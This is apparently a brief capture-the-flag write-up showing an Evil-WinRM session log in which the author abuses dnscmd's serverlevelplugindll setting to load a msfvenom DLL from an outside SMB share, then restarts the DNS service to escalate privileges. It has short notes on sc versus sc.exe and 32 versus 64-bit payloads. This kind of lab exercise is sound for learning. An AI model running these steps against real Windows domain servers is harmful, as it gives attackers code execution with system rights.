#
*Evil-WinRM* PS C:\Users\ryan\Documents> 
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.24\server\payload_x86.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> net use \\10.10.14.24
The command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.24\server\payload.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 640
        FLAGS              : 
*Evil-WinRM* PS C:\Users\ryan\Documents> 


There is a difference between sc and sc.exe which was the largest cause of my failures. 

We could not systeminfo so I tried to use both 32 and 64 bit exploits until one of them worked

64 bit was the winner here --> learn how to use msfvenom with you eyes closed

Everything else needed to exploit this box is right above for a dll injection on the dns service
